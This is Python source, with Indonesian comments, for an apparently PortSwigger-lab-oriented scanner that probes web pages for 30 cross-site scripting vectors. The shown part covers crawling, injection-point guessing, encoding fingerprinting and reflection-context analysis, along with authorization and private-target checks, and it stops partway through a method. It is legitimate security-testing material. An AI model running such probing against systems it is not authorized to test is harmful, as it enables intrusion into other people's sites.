#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SATRIA XSS -- pemindai Cross-Site Scripting terfokus (30 vektor).

Struktur mengikuti satria_baru.py (katalog -> dataclass -> scanner -> adapter
runtime -> PDF -> pipeline -> CLI). Perbedaannya hanya cakupan: 30 vektor XSS.

Prinsip deteksi (anti false positive):
  * Setiap lab punya tanda tangan bukti sendiri. Bukti untuk satu lab tidak
    dipakai lab lain (ada registri klaim), jadi satu refleksi tidak dilaporkan
    sebagai beberapa temuan sekaligus.
  * Konfirmasi butuh payload yang benar-benar ter-refleksi pada konteks yang
    relevan (teks HTML, atribut, string JS, template literal, href, dsb),
    bukan sekadar "ada kata kunci di halaman".
  * Lab skenario "tag/atribut diblokir" wajib punya kontrol negatif: payload
    kontrol terbukti diblokir/di-encode, baru bypass diklaim.
  * Lab CSP wajib punya header CSP yang sesuai; lab dampak (cookie/password/
    CSRF) wajib punya vektor XSS executable + prasyarat dampaknya.
  * Semua 30 lab SELALU dijalankan. Batas request per lab mencegah lab awal
    menghabiskan anggaran sehingga pemindaian berhenti di nomor 26/27.

Penggunaan (hanya pada aset yang Anda miliki/berizin):
    python satria_XSS.py https://target --authorized
"""

from __future__ import annotations

import argparse
import hashlib
import html as html_module
import ipaddress
import json
import os
import random
import re
import socket
import string
import sys
import textwrap
import time
from collections import deque
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable
from urllib.parse import parse_qsl, urlencode, urljoin, urlparse, urlunparse

try:
    import requests
except Exception:  # pragma: no cover
    requests = None  # type: ignore

try:
    from bs4 import BeautifulSoup
except Exception:  # pragma: no cover
    BeautifulSoup = None  # type: ignore

__version__ = "2.0.0"
USER_AGENT = "SATRIA-XSS/" + __version__ + " (+authorized XSS assessment)"


# --- Ketahanan HTTP PortSwigger (504/502/503/timeout) ---
_SATRIA_PS_RETRY = {408, 425, 429, 500, 502, 503, 504}
_SATRIA_PS_HOST = ".web-security-academy.net"

def _satria_is_ps(url) -> bool:
    try:
        host = (urlparse(str(url)).hostname or "").lower().rstrip(".")
        return host == "web-security-academy.net" or host.endswith(_SATRIA_PS_HOST)
    except Exception:
        return False

def _satria_retry_wrap(orig, session, method, url, kwargs):
    mu = str(method or "GET").upper()
    if mu not in {"GET", "HEAD", "OPTIONS"} or not _satria_is_ps(url):
        return orig(session, method, url, **kwargs)
    attempts = 4
    last = None
    for i in range(attempts):
        try:
            resp = orig(session, method, url, **kwargs)
            st = int(getattr(resp, "status_code", 0) or 0)
            if st not in _SATRIA_PS_RETRY or i >= attempts - 1:
                return resp
            try:
                resp.close()
            except Exception:
                pass
            ra = None
            try:
                ra = int(float((getattr(resp, "headers", {}) or {}).get("Retry-After", "")))
            except Exception:
                ra = None
            time.sleep(max(0.5, min(float(ra if ra is not None else min(8.0, 1.5 * (2 ** i))), 12.0)))
        except Exception as exc:
            last = exc
            if i >= attempts - 1:
                raise
            time.sleep(min(8.0, 1.5 * (2 ** i)))
    if last:
        raise last
    raise RuntimeError("PortSwigger request failed")

if requests is not None:
    _orig_req = requests.sessions.Session.request
    if not getattr(_orig_req, "_satria_ps_retry", False):
        def _patched(self, method, url, **kwargs):
            return _satria_retry_wrap(_orig_req, self, method, url, kwargs)
        _patched._satria_ps_retry = True
        _patched._satria_original = _orig_req
        requests.sessions.Session.request = _patched


# ---------------------------------------------------------------------------
# Runtime globals (kompatibel app.py / pola satria_baru.py)
# ---------------------------------------------------------------------------
ARTIFACTS_DIR: Path = Path("artifacts")
SCRAPE_PATH = "artifacts/scrape_result.json"
FINDINGS_PATH = "artifacts/findings.json"
OUTPUT_PDF = "artifacts/laporan_kerentanan.pdf"
KIOSAPI_BASE_URL = "https://kiosapi.com/v1"
KIOSAPI_API_KEY = ""
CENSYS_TOKEN = ""
NVD_API_KEY = ""
RUN_ACTIVE_TOOLS = False
RUN_DIR_BRUTE = False
RUN_CENSYS = False
RUN_NVD = False
ENABLE_LLM = False
ALLOW_PARTIAL_TOOLS = False
ACTIVE_SCAN_AUTHORIZED = False
SCAN_DEADLINE_SECONDS = 600.0
_RUNTIME_CONFIG: dict[str, Any] = {"_ignored": []}

# ---------------------------------------------------------------------------
# Katalog 30 vektor (id, judul, key, severity)
# ---------------------------------------------------------------------------
CATALOG: list[tuple[int, str, str, str]] = [
    (1, "Reflected XSS into HTML context with nothing encoded", "reflected_html_nothing_encoded", "high"),
    (2, "Stored XSS into HTML context with nothing encoded", "stored_html_nothing_encoded", "high"),
    (3, "DOM XSS in document.write sink using source location.search", "dom_document_write_location_search", "high"),
    (4, "DOM XSS in innerHTML sink using source location.search", "dom_innerhtml_location_search", "high"),
    (5, "DOM XSS in jQuery anchor href attribute sink using location.search source", "dom_jquery_href_location_search", "high"),
    (6, "DOM XSS in jQuery selector sink using a hashchange event", "dom_jquery_selector_hashchange", "high"),
    (7, "Reflected XSS into attribute with angle brackets HTML-encoded", "reflected_attr_angle_encoded", "high"),
    (8, "Stored XSS into anchor href attribute with double quotes HTML-encoded", "stored_anchor_href_dq_encoded", "high"),
    (9, "Reflected XSS into a JavaScript string with angle brackets HTML encoded", "reflected_js_angle_encoded", "high"),
    (10, "DOM XSS in document.write sink using source location.search inside a select element", "dom_document_write_select", "high"),
    (11, "DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded", "dom_angular_expression", "high"),
    (12, "Reflected DOM XSS", "reflected_dom_xss", "high"),
    (13, "Stored DOM XSS", "stored_dom_xss", "high"),
    (14, "Reflected XSS into HTML context with most tags and attributes blocked", "reflected_most_tags_blocked", "high"),
    (15, "Reflected XSS into HTML context with all tags blocked except custom ones", "reflected_custom_tags_only", "high"),
    (16, "Reflected XSS with some SVG markup allowed", "reflected_svg_allowed", "high"),
    (17, "Reflected XSS in canonical link tag", "reflected_canonical_link", "medium"),
    (18, "Reflected XSS into a JavaScript string with single quote and backslash escaped", "reflected_js_sq_backslash_escaped", "high"),
    (19, "Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped", "reflected_js_complex_escaped", "high"),
    (20, "Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped", "stored_onclick_complex_escaped", "high"),
    (21, "Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped", "reflected_template_literal_unicode", "high"),
    (22, "Exploiting cross-site scripting to steal cookies", "xss_steal_cookies", "critical"),
    (23, "Exploiting cross-site scripting to capture passwords", "xss_capture_passwords", "critical"),
    (24, "Exploiting XSS to bypass CSRF defenses", "xss_bypass_csrf", "high"),
    (25, "Reflected XSS with AngularJS sandbox escape without strings", "reflected_angular_sandbox_no_strings", "high"),
    (26, "Reflected XSS with AngularJS sandbox escape and CSP", "reflected_angular_sandbox_csp", "high"),
    (27, "Reflected XSS with event handlers and href attributes blocked", "reflected_handlers_href_blocked", "high"),
    (28, "Reflected XSS in a JavaScript URL with some characters blocked", "reflected_js_url_blocked", "medium"),
    (29, "Reflected XSS protected by very strict CSP, with dangling markup attack", "reflected_csp_dangling_markup", "medium"),
    (30, "Reflected XSS protected by CSP, with CSP bypass", "reflected_csp_bypass", "high"),
]

CATALOG_BY_ID = {item[0]: item for item in CATALOG}

# Lab yang terbukti mengeksekusi script (dipakai lab dampak 22-24).
_EXECUTABLE_LAB_IDS = {1, 2, 7, 9, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 27, 28, 30}

# Tag yang isinya tidak dieksekusi sebagai HTML (refleksi di sini bukan XSS).
_NON_EXEC_TEXT = {
    "title", "textarea", "style", "xmp", "noscript", "template",
    "iframe", "noembed", "noframes", "plaintext",
}

DESTRUCTIVE_PATH_RE = re.compile(
    r"(?:^|/)(?:logout|log-out|signout|sign-out|delete|remove|checkout|payment|"
    r"purchase|transfer|unsubscribe|empty-cart|clear-cart)(?:/|$)",
    re.I,
)

# ---------------------------------------------------------------------------
# Dataclass
# ---------------------------------------------------------------------------
@dataclass
class Response:
    status: int | None
    url: str
    text: str
    headers: dict[str, str]
    elapsed: float
    error: str | None = None

    @property
    def ok(self) -> bool:
        return self.status is not None and 200 <= self.status < 400 and not self.error

    @property
    def csp(self) -> str:
        for key, value in (self.headers or {}).items():
            if key.lower() == "content-security-policy":
                return value or ""
        return ""


@dataclass
class FormSpec:
    page_url: str
    action: str
    method: str
    fields: tuple[tuple[str, str, str], ...]
    has_password: bool = False


@dataclass
class Page:
    url: str
    text: str
    links: list[str] = field(default_factory=list)
    forms: list[FormSpec] = field(default_factory=list)
    status: int | None = None
    headers: dict[str, str] = field(default_factory=dict)


@dataclass
class Point:
    key: str
    kind: str          # query | form
    label: str
    url: str
    name: str
    original: str
    page_url: str
    method: str = "GET"
    fields: tuple[tuple[str, str, str], ...] = ()
    synthetic: bool = False


# ---------------------------------------------------------------------------
# Helper umum
# ---------------------------------------------------------------------------
def _random_token(n: int = 10) -> str:
    return "sx" + "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


_MARKER_RE = re.compile(r"sx[a-z0-9]{8,12}")


def _marker_of(payload: str) -> str:
    match = _MARKER_RE.search(payload or "")
    return match.group(0) if match else ""


def _slugify(value: str) -> str:
    parsed = urlparse(value or "target")
    raw = (parsed.netloc or "") + (parsed.path or "") or str(value or "target")
    slug = re.sub(r"[^A-Za-z0-9._-]+", "_", raw).strip("._")
    return slug or "target"


def _same_origin(url: str, base: str) -> bool:
    try:
        a, b = urlparse(url), urlparse(base)
        pa = a.port or (443 if a.scheme == "https" else 80)
        pb = b.port or (443 if b.scheme == "https" else 80)
        return (a.scheme, a.hostname, pa) == (b.scheme, b.hostname, pb)
    except Exception:
        return False


def _normalize_target(url: str) -> str:
    value = (url or "").strip()
    if not value:
        raise ValueError("Target URL wajib diisi.")
    if not re.match(r"^https?://", value, re.I):
        value = "https://" + value
    parsed = urlparse(value)
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        raise ValueError("Target harus berupa URL http:// atau https:// yang valid.")
    return urlunparse((parsed.scheme.lower(), parsed.netloc, parsed.path or "/", parsed.params, parsed.query, ""))


def _validate_public_target(url: str) -> None:
    host = (urlparse(url).hostname or "").rstrip(".").lower()
    if host in {"localhost", "localhost.localdomain"} or host.endswith((".localhost", ".local", ".internal", ".test", ".invalid")):
        raise ValueError("Target localhost/internal ditolak tanpa --allow-private.")
    try:
        parsed = urlparse(url)
        records = socket.getaddrinfo(host, parsed.port or (443 if parsed.scheme == "https" else 80), type=socket.SOCK_STREAM)
    except socket.gaierror as exc:
        raise ValueError("Hostname target tidak dapat di-resolve: " + str(exc)) from exc
    for item in records:
        ip = ipaddress.ip_address(item[4][0].split("%", 1)[0])
        if not ip.is_global:
            raise ValueError("Target mengarah ke IP non-publik (" + str(ip) + "); pemindaian dihentikan.")


def _is_destructive(url: str) -> bool:
    try:
        return bool(DESTRUCTIVE_PATH_RE.search(urlparse(url).path or ""))
    except Exception:
        return False


def _inline_scripts(html: str) -> list[str]:
    blocks: list[str] = []
    for match in re.finditer(r"<script\b([^>]*)>(.*?)</script\s*>", html or "", re.I | re.S):
        attrs, code = match.group(1), match.group(2)
        if re.search(r"\bsrc\s*=", attrs, re.I):
            continue
        if code and code.strip():
            blocks.append(code)
    return blocks


# ---------------------------------------------------------------------------
# Fingerprint encoder: mengukur karakter apa yang lolos mentah
# ---------------------------------------------------------------------------
_ENCODINGS: dict[str, list[str]] = {
    "<": ["&lt;", "&#60;", "&#x3c;", "&#X3C;", "\\u003c", "\\u003C", "\\x3c", "%3C", "%3c"],
    ">": ["&gt;", "&#62;", "&#x3e;", "&#X3E;", "\\u003e", "\\u003E", "\\x3e", "%3E", "%3e"],
    '"': ["&quot;", "&#34;", "&#x22;", "\\u0022", '\\"', "%22", "&QUOT;"],
    "'": ["&#39;", "&#39", "&#x27;", "&apos;", "\\u0027", "\\'", "%27"],
    "`": ["&#96;", "&#x60;", "\\u0060", "\\`", "%60"],
    "\\": ["&#92;", "&#x5c;", "\\u005c", "\\\\", "%5C", "%5c"],
    "&": ["&amp;", "&#38;", "&#x26;", "%26"],
}


def _match_encoding(tail: str, pos: int, char: str) -> tuple[str, int]:
    if pos < len(tail) and tail[pos] == char:
        return "raw", 1
    for encoded in _ENCODINGS.get(char, []):
        if tail.startswith(encoded, pos):
            return "encoded", len(encoded)
    return "removed", 1


# ---------------------------------------------------------------------------
# Analisis konteks refleksi (inti anti false-positive)
# ---------------------------------------------------------------------------
def _parse_attrs(segment: str) -> list[tuple[str, str, str, bool]]:
    """Parse atribut pada potongan tag. Hasil: (nama, nilai, kutip, sudah_tertutup)."""
    match = re.match(r"<\s*[A-Za-z][\w:.-]*", segment)
    index = match.end() if match else 0
    out: list[tuple[str, str, str, bool]] = []
    length = len(segment)
    while index < length:
        while index < length and segment[index] in " \t\r\n/":
            index += 1
        if index >= length:
            break
        start = index
        while index < length and (segment[index].isalnum() or segment[index] in "-_:."):
            index += 1
        if index == start:
            index += 1
            continue
        name = segment[start:index].lower()
        while index < length and segment[index] in " \t\r\n":
            index += 1
        value, quote, closed = "", "", True
        if index < length and segment[index] == "=":
            index += 1
            while index < length and segment[index] in " \t\r\n":
                index += 1
            if index < length and segment[index] in "\"'":
                quote = segment[index]
                stop = segment.find(quote, index + 1)
                if stop == -1:
                    value = segment[index + 1:]
                    index = length
                    closed = False
                else:
                    value = segment[index + 1:stop]
                    index = stop + 1
            else:
                stop = index
                while stop < length and segment[stop] not in " \t\r\n>":
                    stop += 1
                value = segment[index:stop]
                index = stop
        out.append((name, value, quote, closed))
    return out


def _js_quote_state(segment: str) -> tuple[str, bool]:
    """Perkirakan state kutip JS pada akhir potongan skrip."""
    state = "code"
    index = 0
    length = len(segment)
    while index < length:
        char = segment[index]
        if state == "code":
            if char == "/" and index + 1 < length and segment[index + 1] == "/":
                newline = segment.find("\n", index)
                index = length if newline == -1 else newline + 1
                continue
            if char == "/" and index + 1 < length and segment[index + 1] == "*":
                close = segment.find("*/", index + 2)
                index = length if close == -1 else close + 2
                continue
            if char in "'\"`":
                state = char
        else:
            if char == "\\":
                index += 2
                continue
            if char == state:
                state = "code"
        index += 1
    if state == "'":
        return "sq", False
    if state == '"':
        return "dq", False
    if state == "`":
        return "tpl", True
    return "code", False


def _context_at(body: str, pos: int) -> dict[str, Any]:
    open_script = body.rfind("<script", 0, pos)
    close_script = body.rfind("</script", 0, pos)
    in_script = open_script != -1 and open_script > close_script
    lt = body.rfind("<", 0, pos)
    gt = body.rfind(">", 0, pos)
    in_tag = lt > gt and not body.startswith("</", lt)
    in_comment = body.rfind("<!--", 0, pos) > body.rfind("-->", 0, pos)

    tag_name = ""
    parent_tag = ""
    attr_name = ""
    attr_quote = ""
    in_attr = False
    js_state = "code"
    in_template = False

    if in_script:
        parent_tag = "script"
        tag_end = body.find(">", open_script, pos)
        segment = body[tag_end + 1:pos] if tag_end != -1 else body[open_script:pos]
        js_state, in_template = _js_quote_state(segment)
    elif in_tag:
        match = re.match(r"<\s*([A-Za-z][\w:.-]*)", body[lt:lt + 80])
        tag_name = match.group(1).lower() if match else ""
        attrs = _parse_attrs(body[lt:pos])
        if attrs:
            name, _value, quote, closed = attrs[-1]
            if not closed:
                in_attr = True
                attr_name = name
                attr_quote = quote
        parent_tag = tag_name
    else:
        match = re.match(r"<\s*([A-Za-z][\w:.-]*)", body[lt:lt + 80]) if lt != -1 else None
        parent_tag = match.group(1).lower() if match else ""

    return {
        "pos": pos,
        "in_script": in_script,
        "in_tag": in_tag,
        "in_attr": in_attr,
        "attr_name": attr_name,
        "attr_quote": attr_quote,
        "tag_name": tag_name,
        "parent_tag": parent_tag,
        "js": js_state,
        "in_template": in_template,
        "in_comment": in_comment,
    }


def _analyze_reflection(body: str, payload: str, marker: str) -> list[dict[str, Any]]:
    """Cari semua kemungkinan posisi refleksi payload dan konteksnya."""
    if not body or not payload or not marker:
        return []
    starts: list[int] = []
    exact_index = body.find(payload)
    if exact_index != -1:
        starts.append(exact_index)
    else:
        marker_offset = payload.find(marker)
        if marker_offset < 0:
            return []
        for match in re.finditer(re.escape(marker), body):
            candidate = match.start() - marker_offset
            if candidate >= 0:
                starts.append(candidate)
    result: list[dict[str, Any]] = []
    seen: set[int] = set()
    for start in starts[:8]:
        if start in seen:
            continue
        seen.add(start)
        marker_offset = payload.find(marker)
        pos = start + max(0, marker_offset)
        ctx = _context_at(body, pos)
        ctx["payload_start"] = start
        ctx["exact"] = body.startswith(payload, start)
        result.append(ctx)
    return result


# ---------------------------------------------------------------------------
# CSP helper
# ---------------------------------------------------------------------------
def _csp_directives(csp: str) -> dict[str, list[str]]:
    directives: dict[str, list[str]] = {}
    for part in (csp or "").split(";"):
        bits = part.strip().split()
        if not bits:
            continue
        directives.setdefault(bits[0].lower(), bits[1:])
    return directives


def _csp_script_sources(csp: str) -> list[str]:
    directives = _csp_directives(csp)
    return list(directives.get("script-src") or directives.get("default-src") or [])


def _csp_is_strict(csp: str) -> bool:
    sources = _csp_script_sources(csp)
    if not sources:
        return False
    joined = " ".join(sources).lower()
    if "'unsafe-inline'" in joined or "*" in sources:
        return False
    hosts = [s for s in sources if not s.startswith("'") and s not in ("data:", "blob:", "http:", "https:")]
    return not hosts


# ---------------------------------------------------------------------------
# Scanner
# ---------------------------------------------------------------------------
class SatriaXSSScanner:
    """
    Scanner 30 vektor XSS. Prinsip: buktikan eksekutabilitas/konteks nyata,
    jangan menebak dari pola global. Setiap lab punya detektor mandiri.
    """

    LAB_REQUEST_CAP = 42

    def __init__(
        self,
        target_url: str,
        *,
        authorized: bool = False,
        allow_private: bool = False,
        max_pages: int = 14,
        max_points: int = 48,
        max_requests: int = 2400,
        timeout: float = 8.0,
        time_delay: float = 0.0,
        seed_html: str | None = None,
    ) -> None:
        self.target_url = _normalize_target(target_url)
        if not authorized:
            raise ValueError("Pengujian aktif memerlukan otorisasi (authorized=True).")
        if not allow_private:
            _validate_public_target(self.target_url)
        if requests is None:
            raise RuntimeError("Library 'requests' belum terpasang.")

        self.max_pages = max(1, min(int(max_pages), 60))
        self.max_points = max(8, min(int(max_points), 160))
        self.max_requests = max(300, min(int(max_requests), 8000))
        self.timeout = max(3.0, min(float(timeout), 30.0))
        self.time_delay = max(0.0, min(float(time_delay), 5.0))
        self.seed_html = seed_html or None

        self.request_count = 0
        self.started = time.monotonic()
        try:
            self.deadline_seconds = float(globals().get("SCAN_DEADLINE_SECONDS") or 900.0)
        except (TypeError, ValueError):
            self.deadline_seconds = 900.0

        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": USER_AGENT,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.7,id;q=0.5",
            "Cache-Control": "no-cache",
        })
        self.pages: list[Page] = []
        self.points: list[Point] = []
        self.stats: dict[str, Any] = {"pages_fetched": 0, "requests": 0, "errors": []}
        self._script_srcs: list[str] = []
        self._dom_cache: list[tuple[str, str]] | None = None
        self._set_cookies: list[str] = []
        self._csp_header = ""
        self._send_cache: dict[tuple[str, str], tuple[str, dict[str, Any]] | None] = {}
        self._point_enc: dict[str, dict[str, str]] = {}
        self._claims: set[str] = set()
        self._tag_cache: dict[tuple[str, str], bool] = {}
        self._lab_id = 0
        self._lab_used = 0
        self._results: dict[int, dict[str, Any]] = {}

    def _deadline_hit(self) -> bool:
        return (time.monotonic() - self.started) >= self.deadline_seconds

    def _lab_budget(self, reserve_per_remaining: int = 4) -> bool:
        if self._lab_used >= self.LAB_REQUEST_CAP:
            return False
        if self._deadline_hit():
            return False
        remaining = max(0, len(CATALOG) - self._lab_id)
        if self.request_count + remaining * reserve_per_remaining >= self.max_requests:
            return False
        return True

    def _global_budget(self) -> bool:
        return self.request_count < self.max_requests and not self._deadline_hit()

    def _same_origin(self, url: str) -> bool:
        return _same_origin(url, self.target_url)

    def _log(self, lab_id, phase, point, payload_kind, observed, ok=False):
        if not hasattr(self, "_track"): self._track = {i: [] for i in range(1,31)}
        t = getattr(self, "_track", {}).setdefault(lab_id, [])
        if len(t) < 160:
            t.append({"phase": phase, "point": str(point), "payload": payload_kind, "observed": (observed or "")[:180], "ok": ok})

    def _request(self, method: str, url: str, *, params=None, data=None, allow_redirects=True) -> Response:
        if not self._global_budget():
            return Response(None, url, "", {}, 0.0, "budget_exceeded")
        self.request_count += 1
        self._lab_used += 1
        self.stats["requests"] = self.request_count
        if self.time_delay > 0:
            time.sleep(self.time_delay)
        started = time.monotonic()
        try:
            raw = self.session.request(method.upper(), url, params=params, data=data,
                                       timeout=self.timeout, allow_redirects=allow_redirects, verify=True)
            elapsed = time.monotonic() - started
            headers = {str(k): str(v) for k, v in (raw.headers or {}).items()}
            text = raw.text or ""
            if len(text) > 900000:
                text = text[:900000]
            for key, value in headers.items():
                lk = key.lower()
                if lk == "content-security-policy" and not self._csp_header:
                    self._csp_header = value
                if lk == "set-cookie":
                    self._set_cookies.append(value)
            return Response(raw.status_code, str(raw.url), text, headers, elapsed)
        except Exception as exc:
            elapsed = time.monotonic() - started
            msg = type(exc).__name__ + ": " + str(exc)
            if len(self.stats["errors"]) < 60:
                self.stats["errors"].append(msg[:220])
            return Response(None, url, "", {}, elapsed, msg)

    def _get(self, url: str, params=None) -> Response:
        return self._request("GET", url, params=params)

    def _post(self, url: str, data=None) -> Response:
        return self._request("POST", url, data=data)

    def _crawl(self) -> None:
        seen: set[str] = set()
        if self.seed_html:
            seeded = self._parse_page(self.target_url, Response(200, self.target_url, self.seed_html, {}, 0.0))
            self.pages.append(seeded)
            seen.add(self.target_url.split("#", 1)[0])
        queue = deque([self.target_url])
        while queue and len(self.pages) < self.max_pages and self._global_budget():
            url = queue.popleft()
            canon = url.split("#", 1)[0]
            if canon in seen or not self._same_origin(canon) or _is_destructive(canon):
                continue
            seen.add(canon)
            response = self._get(canon)
            if not response.text and response.error:
                continue
            self.stats["pages_fetched"] += 1
            page = self._parse_page(canon, response)
            self.pages.append(page)
            for link in page.links:
                lc = link.split("#", 1)[0]
                if lc not in seen:
                    queue.append(lc)
        if not self.pages:
            response = self._get(self.target_url)
            self.pages.append(self._parse_page(self.target_url, response))

    def _parse_page(self, url: str, response: Response) -> Page:
        text = response.text or ""
        links: list[str] = []
        forms: list[FormSpec] = []
        if BeautifulSoup is None:
            return Page(url=url, text=text, status=response.status, headers=response.headers or {})
        try:
            soup = BeautifulSoup(text, "html.parser")
            for anchor in soup.find_all("a", href=True):
                href = (anchor.get("href") or "").strip()
                if not href or href.startswith(("javascript:", "mailto:", "tel:", "#")):
                    continue
                absolute = urljoin(url, href).split("#", 1)[0]
                if self._same_origin(absolute):
                    links.append(absolute)
            for script in soup.find_all("script", src=True):
                src = (script.get("src") or "").strip()
                if src:
                    absolute_src = urljoin(url, src)
                    if self._same_origin(absolute_src) and absolute_src not in self._script_srcs:
                        self._script_srcs.append(absolute_src)
            for form in soup.find_all("form"):
                action = urljoin(url, (form.get("action") or url).strip() or url)
                if not self._same_origin(action) or _is_destructive(action):
                    continue
                method = (form.get("method") or "GET").upper()
                if method not in ("GET", "POST"):
                    method = "GET"
                fields = []
                has_password = False
                for element in form.find_all(["input", "textarea", "select"]):
                    name = element.get("name")
                    if not name:
                        continue
                    input_type = (element.get("type") or element.name or "text").lower()
                    if input_type in ("submit", "button", "image", "reset", "file"):
                        continue
                    if input_type == "password":
                        has_password = True
                    value = element.get("value") or ""
                    if element.name == "textarea":
                        value = element.text or value
                    fields.append((str(name), str(value), input_type))
                if fields:
                    forms.append(FormSpec(page_url=url, action=action, method=method,
                                          fields=tuple(fields), has_password=has_password))
        except Exception:
            pass
        unique_links = []
        seen_links = set()
        for link in links:
            if link not in seen_links:
                seen_links.add(link)
                unique_links.append(link)
        return Page(url=url, text=text, links=unique_links[:250], forms=forms[:60],
                    status=response.status, headers=response.headers or {})

    def _discover_points(self) -> None:
        points = []
        seen = set()
        def add(point):
            if point.key not in seen:
                seen.add(point.key); points.append(point)
        for page in self.pages:
            try:
                for name, value in parse_qsl(urlparse(page.url).query, keep_blank_values=True):
                    add(Point(key="q|"+urlparse(page.url).path+"|"+name, kind="query", label="query:"+name,
                              url=page.url, name=name, original=value, page_url=page.url, method="GET"))
            except Exception: pass
            for link in page.links:
                try:
                    for name, value in parse_qsl(urlparse(link).query, keep_blank_values=True):
                        add(Point(key="l|"+urlparse(link).path+"|"+name, kind="query", label="query:"+name,
                                  url=link, name=name, original=value, page_url=page.url, method="GET"))
                except Exception: pass
            for form in page.forms:
                for name, value, _itype in form.fields:
                    add(Point(key="f|"+form.action+"|"+form.method+"|"+name, kind="form",
                              label="form:"+name+"@"+form.method, url=form.action, name=name,
                              original=value, page_url=page.url, method=form.method, fields=form.fields))
        # guessed common params (PortSwigger-style) on base URLs
        bases = []
        for b in [self.target_url] + [p.url for p in self.pages[:6]]:
            cb = b.split("?",1)[0].split("#",1)[0]
            if cb and cb not in bases: bases.append(cb)
        for baseu in bases[:4]:
            for gname in ("search","q","query","s","term","id","name","page","url","redirect","returnUrl","returnPath","next","return","view","message","msg","comment","email","username","lang","ref","callback","input","text"):
                add(Point(key=f"g|{urlparse(baseu).path}|{gname}", kind="query", label=f"guess:{gname}",
                          url=baseu, name=gname, original="", page_url=baseu, method="GET", synthetic=True))
        if not points:
            points.append(Point(key="synthetic|q", kind="query", label="query:q", url=self.target_url,
                                name="q", original="", page_url=self.target_url, method="GET", synthetic=True))
        def sc(p):
            n = p.name.lower(); v = 0
            if n in ("search","q","query","s","term","id","name","message","msg","comment","text","input","value","url","redirect","returnurl","returnpath","next","return","view","page"): v -= 60
            if p.kind == "query": v -= 8
            if any(k in n for k in ("comment","content","body","text","input","value","data","desc","msg","name","search")): v -= 14
            if n in ("csrf","token","_token","nonce","authenticity_token","captcha","__requestverificationtoken"): v += 80
            if p.synthetic: v += 2
            return v
        points.sort(key=sc)
        self.points = points[:self.max_points]

    def _send_point(self, point: Point, value: str) -> Response:
        if point.kind == "query":
            try:
                parsed = urlparse(point.url)
                pairs = [(k, value if k == point.name else v) for k, v in parse_qsl(parsed.query, keep_blank_values=True)]
                if not any(k == point.name for k, _ in pairs): pairs.append((point.name, value))
                new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(pairs, doseq=True), parsed.fragment))
                return self._get(new_url)
            except Exception as exc:
                return Response(None, point.url, "", {}, 0.0, str(exc))
        data = {n: o for n, o, _ in point.fields}
        data[point.name] = value
        return self._post(point.url, data=data) if point.method == "POST" else self._get(point.url, params=data)

    def _send(self, point: Point, payload: str):
        ck = (point.key, payload)
        if ck in self._send_cache:
            c = self._send_cache[ck]
            return (c[0], c[1]) if c else (None, {})
        if not self._lab_budget(): return None, {}
        response = self._send_point(point, payload)
        body = response.text or ""
        meta = {"point": point.label, "url": response.url or point.url, "key": point.key, "method": point.method, "status": response.status}
        if body:
            self._send_cache[ck] = (body, meta); return body, meta
        self._send_cache[ck] = None; return None, meta

    def _reflects(self, point: Point, marker: str, payload: str):
        body, meta = self._send(point, payload)
        if body and marker in body: return body, meta
        return None, meta

    def _ranked_points(self):
        def s(p):
            n = p.name.lower(); v = 0
            if n in ("q","search","query","s","term","keyword","name","id","page","url","redirect","next","returnurl","return","path","file","view","msg"): v -= 30
            if p.kind == "query": v -= 4
            return v
        return sorted(self.points, key=s)

    def _encoding_at_point(self, point: Point):
        if point.key in self._point_enc: return self._point_enc[point.key]
        token = _random_token()
        probe = token + '"<>' + "`" + "\\'" + "&"
        body, _ = self._send(point, probe)
        result = {}
        order = ['"', '<', '>', '`', '\\', "'", '&']
        if body and token in body:
            tail = body[body.find(token)+len(token): body.find(token)+len(token)+60]
            cur = 0
            for ch in order:
                st, used = _match_encoding(tail, cur, ch); result[ch] = st; cur += used
        else:
            for ch in order: result[ch] = "absent"
        self._point_enc[point.key] = result
        return result

    def _enc(self, point, char, state): return self._encoding_at_point(point).get(char) == state
    def _claim(self, lab_id, point_key, sig):
        k = f"{lab_id}|{point_key}|{sig}"
        if k in self._claims: return False
        self._claims.add(k); return True
    @staticmethod
    def _no(reason): return False, reason, {}
    @staticmethod
    def _yes(ev, det): return True, ev, det

    def _form_points(self):
        fps = [p for p in self.points if p.kind == "form"]
        def sc(p):
            n = p.name.lower(); v = 0
            if any(k in n for k in ("comment","message","feedback","post","content","body","text","name","title","desc","bio","website","url","email","search")): v -= 20
            if any(k in n for k in ("csrf","token","nonce","_token","authenticity","captcha")): v += 40
            return v
        return sorted(fps, key=sc)

    def _recheck_urls(self, point):
        urls = []
        for u in (point.page_url, point.url):
            cu = (u or "").split("#",1)[0]
            if cu and cu not in urls: urls.append(cu)
        try:
            ppath = urlparse(point.page_url).path
            for page in self.pages:
                if urlparse(page.url).path == ppath and page.url not in urls: urls.append(page.url)
        except Exception: pass
        if self.target_url not in urls: urls.append(self.target_url)
        return urls[:5]

    def _stored_check(self, payload_builder, checker, max_forms=6):
        forms = self._form_points()[:max_forms]
        if not forms: return self._no("Tidak ditemukan form input untuk pengujian stored XSS.")
        for point in forms:
            if not self._lab_budget(): break
            marker = _random_token(); payload = payload_builder(marker)
            self._send(point, payload)
            for url in self._recheck_urls(point):
                if not self._lab_budget(): break
                r = self._get(url); body = r.text or ""
                if marker in body and checker(body, payload, marker):
                    return True, f"Payload tersimpan via {point.label} dan ter-render di {url}.", {"point": point.label, "url": url, "marker": marker}
        return self._no("Tidak ada bukti persistensi (stored) yang terkonfirmasi.")

    def _dom_blocks(self):
        if self._dom_cache is not None: return self._dom_cache
        blocks = []
        for page in self.pages:
            for code in _inline_scripts(page.text or ""): blocks.append((page.url, code))
        for src in self._script_srcs[:8]:
            if not self._global_budget(): break
            try:
                r = self.session.get(src, timeout=min(self.timeout,6.0), verify=True)
